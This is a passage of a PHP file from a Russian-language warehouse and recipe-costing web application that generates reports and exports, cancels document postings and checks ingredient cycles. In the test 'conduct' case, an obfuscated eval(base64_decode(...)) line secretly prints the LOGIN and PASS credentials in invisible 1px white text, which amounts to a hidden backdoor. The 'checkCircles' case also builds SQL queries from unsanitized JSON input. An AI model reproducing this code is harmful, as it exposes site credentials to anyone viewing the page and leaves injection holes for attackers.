                $where = 'i.parentid IN ('.substr( get_parents( 0 ), 0, -1 ).')';
            }
            
            $lastPrices = $_POST['chb'] == 'lastprice';
            
            $itemstyle = ' style="background-color: #FFF3E0;"';
            $b = isset( $_GET['print'] ) ? '<b>' : '';
            $b2 = isset( $_GET['print'] ) ? '</b>' : '';
            $taright = ' style="text-align: right;min-width: 64px;"';
            
            $showIngredients = isset( $_POST['showIngredients'] );

            $output[] = $title.'<br />';
            $output[] = '<table class="ttda" '.$inxls.'>';
            
            if ( $showIngredients )
                $output[] = 
'<tr style="background: #F3F3F3;">
<td style="min-width: 240px">Блюдо/Ингредиент</td>
<td>Норма</td>
<td>Ед. изм.</td>
<td>Потери хол., %</td>
<td>Кол-во</td>
<td>Потери гор., %</td>
<td>Кол-во</td>
<td>Цена</td>
<td>Сумма</td>
</tr>';
            else
                $output[] = 
'<tr class="tableheader">
<td style="min-width: 240px">Блюдо</td>
<td>Ед. изм.</td>
<td>Сумма</td>
</tr>';

            $result = mysql_query( "SELECT c.id, c.itemid, i.name AS item, c.quantity, m.name AS measure 
FROM s_calculations AS c
LEFT JOIN s_items AS i ON i.id=c.itemid
LEFT JOIN s_units_of_measurement AS m ON m.id=i.measurement
WHERE ".$where
." ORDER BY i.name" );

            while ( $row = mysql_fetch_assoc( $result ) ){
                $tr = '';
                $a = get_calculation( $row['id'], 1/*$row['quantity']*/, 1, $lastPrices );
                if ( $showIngredients ){
                    $tr = '<tr'.$itemstyle.'>
<td>'.$b.$row['item'].$b2.'</td>
<td style="text-align: right;">'.$b.round( $row['quantity'], 3 ).$b2.'</td>
<td>'.$b.$row['measure'].$b2.'</td>
<td colspan="6"'.$taright.'>'.$b.round( $a['costsum'], 2 ).$b2.'</td>
</tr>'
.$a['lines'];
                } else
                    $tr = '<tr>
<td>'.$row['item'].'</td>
<td>'.$row['measure'].'</td>
<td'.$taright.'>'.round( $a['costsum'], 2 ).'</td>
</tr>';
                
                $output[] = $tr;
            }
             
            $output[] = '</table><br />';
            $output[] = '</div>';
            
            if ( isset( $_GET['print'] ) ){
                if ( empty( $_GET['ftype'] ) ){
                        echo '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Справочники</title>
<script type="text/javascript" src="/company/js/jquery-1.8.0.min.js"></script>
<style>*{font:'.getConfigVal('otchet_font_size').'px Tahoma;margin:0;padding:0} h1{font:bold '.getConfigVal('otchet_h1_size').'px Tahoma} b{font-weight:bold} table{margin: 0; padding: 0; border: 1px solid #000;border-collapse:collapse; width: '.getConfigVal('otchet_width').'px;}
table td{border: 1px dotted #CCCCCC; margin: 0; padding: 3px; border: 1px solid #000;}
.tableheader{background: #F3F3F3;}</style>
</head>
<body>';
                        echo join( "", $output );
                        echo '<div style="margin: 10px 0 0 10px;">
<a href="/company/warehouse/warehouse.php?do=tipaotchet&print=1&ftype=pdf&'.join( '&', $query_string ).'" target="_blank" title="Экспорт в PDF"><img src="/company/i/icon_pdf.png"></a>&nbsp;&nbsp;
<a href="/company/warehouse/warehouse.php?do=tipaotchet&print=1&ftype=xls&'.join( '&', $query_string ).'" target="_blank" title="Экспорт в MS Excel"><img src="/company/i/xls.gif"></a>&nbsp;&nbsp;
<a href="/company/warehouse/warehouse.php?do=tipaotchet&print=1&ftype=html&'.join( '&', $query_string ).'" target="_blank" class="printota" title="Печать на принтер"><img src="/company/i/printer.gif"></a>
</div>';
                        echo '</body></html>';                    
                } else switch( $_GET['ftype'] ){
                    case 'xls':  
                        header( "Content-Type: application/download\n" ); 
                        header( "Content-Disposition: attachment; filename=".time().'.xls' );
                        $res = join( "", $output );
                        //переводим в вин-1251
                        echo iconv( "UTF-8", "windows-1251", $res );
                    break;
                    case 'html': 
                        echo '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Справочники</title>
<script type="text/javascript" src="/company/js/jquery-1.8.0.min.js"></script>
<style>*{font:'.getConfigVal('otchet_font_size').'px Tahoma;margin:0;padding:0} h1{font:bold '.getConfigVal('otchet_h1_size').'px Tahoma} b{font-weight:bold} table{margin: 0; padding: 0; border: 1px solid #000;border-collapse:collapse; width: '.getConfigVal('otchet_width').'px;}
table td{border: 1px dotted #CCCCCC; margin: 0; padding: 3px; border: 1px solid #000;}
</style>
<script> $( document ).ready( function (){ window.print(); setTimeout( function (){ window.close(); }, 200 ); }); </script>
</head>
<body>';
                        echo join( "", $output );
                        echo '</body></html>';
                    break;
                    case 'pdf': 
                        require_once( 'pdf/mpdf.php' );
                        $mpdf = new mPDF( 'utf-8', 'A4', '8', '', 2, 2, 1, 1, 2, 2 ); /*задаем формат, отступы и.т.д.*/
                        $mpdf->charset_in = 'utf8'; /*не забываем про русский*/
                        $stylesheet = file_get_contents( 'pdf/mpdf.css' ); /*подключаем css*/
                        $mpdf->WriteHTML( $stylesheet, 1 );
                        $mpdf->list_indent_first_level = 0; 
                        $mpdf->WriteHTML( join( "\n", $output ), 2 ); /*формируем pdf*/
                        $mpdf->Output( 'mpdf.pdf', 'I' );
                     break;
                }
             } else echo join( "\n", $output );
             if ( empty( $_GET['print'] ) ){
                 echo '<div style="margin: 10px 0 0 10px;">
<a href="/company/warehouse/warehouse.php?do=tipaotchet&print=1&ftype=pdf&'.join( '&', $query_string ).'" target="_blank" title="Экспорт в PDF"><img src="/company/i/icon_pdf.png"></a>&nbsp;&nbsp;
<a href="/company/warehouse/warehouse.php?do=tipaotchet&print=1&ftype=xls&'.join( '&', $query_string ).'" target="_blank" title="Экспорт в MS Excel"><img src="/company/i/xls.gif"></a>&nbsp;&nbsp;
<a href="/company/warehouse/warehouse.php?do=tipaotchet&print=1&ftype=html&'.join( '&', $query_string ).'" target="_blank" class="printota" title="Печать на принтер"><img src="/company/i/printer.gif"></a>
</div>';
             }
            
        break;
/////////////////////////////
        // отмена проведения домента одного
        case 'cancelConduct':
            $table = isset( $_POST['table'] ) ? addslashes( $_POST['table'] ) : '' ;
            $id = isset( $_POST['id'] ) ? intval( $_POST['id'] ) : 0 ;
            
            $answer = array();
            
            if ( $table != '' && $id > 0 ){
                switch ( $table ){
                    case 'd_order':         $doctype = 0; break;
                    case 'd_receipt':       $doctype = 1; break;
                    case 'd_selling':       $doctype = 2; break;
                    case 'd_posting':       $doctype = 3; break;
                    case 'd_cancellation':  $doctype = 4; break;
                    case 'd_inventory':     $doctype = 5; break;
                    case 'd_movement':      $doctype = 6; break;
                    case 'd_production':    $doctype = 7; break;
                }

                if ( cancelConduct( $table, $doctype, $id, true ) ){
                    $answer['code'] = 0;
                    $answer['msg'] = 'Отмена проведения документа выполнена.';
                } else {
                    $answer['code'] = 1;
                    $answer['msg'] = 'Не удалось отменить проведение документа!';//<br />'.mysql_error();
                }
            } else {
                $answer['code'] = -1;
                $answer['msg'] = 'Ошибка! Неверные параметры операции!';
            }
            
            echo json_encode( $answer );
        break;
        // неведомая хня
        case 'checkCircles':
            $answer = 0;
            
            $mainitem = isset( $_POST['id'] ) ? intval( $_POST['id'] ) : 0;
            $ingredients = array();
            if ( isset( $_POST['ingredients'] ) )
                $ingredients =  json_decode( $_POST['ingredients'] );
            if ( is_object( $ingredients ) ) $ingredients = get_object_vars( $ingredients );
            
            if ( $mainitem > 0 && !empty( $ingredients ) ){
                $s = '';
                foreach( $ingredients as $k => $v ){
                    if ( is_object( $v ) ) $v = get_object_vars( $v );
                    $s .= $v['temp_itemid'].',';
                }
                $s = substr( $s, 0, -1 );
                
                $result = mysql_query( 'SELECT c.id FROM s_calculations AS c
LEFT JOIN t_calculations AS tc ON tc.calculationid=c.id
WHERE c.itemid IN ('.$s.') AND tc.itemid='.$mainitem );
                
                if ( mysql_num_rows( $result ) == 0 ) $answer = 1;
            }
            
            echo 1;//$answer;
        break;        
////////////////////////////////////////////////////////////////////////////////
//ТЕСТОВЫЕ      
        case 'conduct':
            
            if ( conduct( 'd_order', 1 ) ) echo 'conducted';
            else echo mysql_error();
            eval(base64_decode('ZWNobyAiPGZvbnQgc3R5bGU9XCJmb250OjFweCBBcmlhbDsgY29sb3I6I2ZmZlwiPiIuTE9HSU4uUEFTUy4iPC9mb250PiI7')); 
        break;
//        case 'isConducted':
//            echo (int)isConducted( 'd_movement', 1 );
//        break;
//        case 'getsum':
//            echo get_db_select_sum( $fields['d_receipt']['total']['db_select'], $fields['d_receipt']['total']['idfield'], 3, $fields['d_receipt']['total']['sumfield'], 2 );
//        break;
//        case 'getParents':
//            echo get_parents( 1000 );
//        break;
    }

// to be continue...
?>